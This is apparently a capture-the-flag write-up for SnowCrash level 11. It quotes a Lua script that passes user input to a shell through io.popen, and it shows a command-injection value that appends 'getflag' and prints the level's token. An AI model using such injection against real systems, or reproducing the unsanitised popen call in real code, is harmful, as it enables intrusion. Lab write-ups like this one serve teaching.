# SnowCrash Level 11

## Introduction
This one was quite simple. We received a .lua file that we extracted to read its contents. After a little bit of time, we noticed that the following code snippet was not very secure:
```
prog = io.popen("echo "..pass.." | sha1sum", "r")
data = prog:read("*all")
```
## Exploitation
Realizing the potential vulnerability, we attempted to inject some commands here: lala | getflag > /tmp/lala.txt.

This simple injection provided us with the token: fa6v5ateaw21peobuub8ipe6s.

## Obtaining the Token
After successfully injecting the command and retrieving the token, we executed getflag:
```
flag11@SnowCrash:~$ getflag 
Check flag. Here is your token: fa6v5ateaw21peobuub8ipe6s
```
